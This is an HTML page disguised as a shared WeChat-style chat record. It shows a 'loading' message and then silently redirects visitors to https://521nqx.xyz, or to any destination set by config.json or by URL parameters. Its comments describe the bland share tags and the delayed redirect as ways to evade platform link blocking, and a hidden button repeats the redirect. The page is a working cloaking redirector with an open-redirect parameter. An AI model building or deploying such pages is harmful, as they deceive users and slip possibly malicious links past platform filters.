<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- 防拦截优化：中性化分享标签 -->
    <meta property="og:title" content="聊天记录">
    <meta property="og:description" content="日常聊天内容">
    <meta property="og:type" content="website">
    <meta name="referrer" content="no-referrer">
    <title>聊天记录</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Microsoft YaHei", sans-serif;
        }
        body {
            background: #F5F5F5;
            padding-top: env(safe-area-inset-top);
            padding-bottom: env(safe-area-inset-bottom);
            -webkit-text-size-adjust: 100%;
            text-size-adjust: 100%;
        }
        .wechat-nav {
            position: sticky;
            top: 0;
            background: #F7F7F7;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 16px;
            border-bottom: 1px solid #E5E5E5;
            z-index: 999;
        }
        .nav-left, .nav-right {
            color: #007AFF;
            font-size: 17px;
            width: 40px;
        }
        .nav-right {
            text-align: right;
        }
        .nav-title-wrap {
            text-align: center;
            flex: 1;
        }
        .nav-title {
            font-size: 17px;
            font-weight: 500;
            color: #000;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            max-width: 280px;
            margin: 0 auto;
        }
        .nav-date {
            font-size: 12px;
            color: #999;
            margin-top: 2px;
        }
        .chat-container {
            padding: 16px;
        }
        .chat-message {
            display: flex;
            margin-bottom: 16px;
            align-items: flex-start;
        }
        .avatar {
            width: 48px;
            height: 48px;
            border-radius: 4px;
            background: #eee center/cover no-repeat;
            margin-right: 10px;
            flex-shrink: 0;
        }
        .message-content-wrap {
            flex: 1;
            max-width: calc(100% - 58px);
        }
        .message-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 4px;
        }
        .nickname {
            font-size: 14px;
            color: #666;
        }
        .time {
            font-size: 14px;
            color: #999;
        }
        .message-bubble {
            background: #FFFFFF;
            border-radius: 8px;
            padding: 10px 14px;
            display: inline-block;
            position: relative;
            box-shadow: 0 1px 2px rgba(0,0,0,0.08);
        }
        .message-bubble::before {
            content: "";
            position: absolute;
            left: -8px;
            top: 12px;
            border: 8px solid transparent;
            border-right-color: #FFFFFF;
        }
        .message-text {
            font-size: 17px;
            color: #000;
            line-height: 1.6;
            white-space: pre-line;
            word-break: break-all;
        }
        /* 隐藏备用跳转按钮，不影响体验 */
        .backup-btn {
            display: none;
        }
    </style>
</head>
<body>
    <div class="wechat-nav">
        <div class="nav-left">&lt;</div>
        <div class="nav-title-wrap">
            <div class="nav-title">聊天记录</div>
            <div class="nav-date">2026年4月25日</div>
        </div>
        <div class="nav-right">...</div>
    </div>

    <div class="chat-container">
        <div class="chat-message">
            <div class="avatar"></div>
            <div class="message-content-wrap">
                <div class="message-header">
                    <span class="nickname">用户</span>
                    <span class="time">00:00</span>
                </div>
                <div class="message-bubble">
                    <div class="message-text">加载中...</div>
                </div>
            </div>
        </div>
    </div>

    <!-- 隐藏式备用跳转按钮 -->
    <button class="backup-btn" onclick="window.location.href='https://521nqx.xyz'">继续访问</button>

    <script>
        // 1. 加载远程配置文件
        async function loadConfig() {
            try {
                const response = await fetch('./config.json?t=' + Date.now());
                if (!response.ok) throw new Error('Config not found');
                return await response.json();
            } catch (error) {
                console.error('加载配置失败，使用默认值:', error);
                return {
                    title: "聊天记录",
                    date: "2026年4月25日",
                    nickname: "用户",
                    time: "17:11:33",
                    content: "加载失败，请稍后重试",
                    avatar: "",
                    redirectUrl: "https://521nqx.xyz",
                    redirectDelay: 1200
                };
            }
        }

        // 2. 解析URL参数（优先级高于远程配置，支持临时修改）
        function getUrlParams() {
            const params = {};
            const urlParams = new URLSearchParams(window.location.search);
            for (const [key, value] of urlParams) {
                params[decodeURIComponent(key)] = decodeURIComponent(value);
            }
            return params;
        }

        // 3. 渲染页面
        function renderPage(config) {
            document.querySelector('.nav-title').innerText = config.title;
            document.querySelector('.nav-date').innerText = config.date;
            document.querySelector('.nickname').innerText = config.nickname;
            document.querySelector('.time').innerText = config.time;
            document.querySelector('.message-text').innerText = config.content.replace(/\\n/g, '\n');
            if (config.avatar) {
                document.querySelector('.avatar').style.backgroundImage = `url(${config.avatar})`;
            }
            document.title = config.title;
            // 更新备用按钮链接
            document.querySelector('.backup-btn').onclick = () => window.location.href = config.redirectUrl;
        }

        // 4. 防拦截延迟跳转
        function startRedirect(url, delay) {
            setTimeout(function() {
                window.location.href = url;
            }, delay);
        }

        // 主流程
        document.addEventListener('DOMContentLoaded', async function() {
            const remoteConfig = await loadConfig();
            const urlParams = getUrlParams();
            // URL参数覆盖远程配置，支持临时修改
            const finalConfig = { ...remoteConfig, ...urlParams };
            
            renderPage(finalConfig);
            startRedirect(finalConfig.redirectUrl, finalConfig.redirectDelay);
        });
    </script>
</body>
</html>
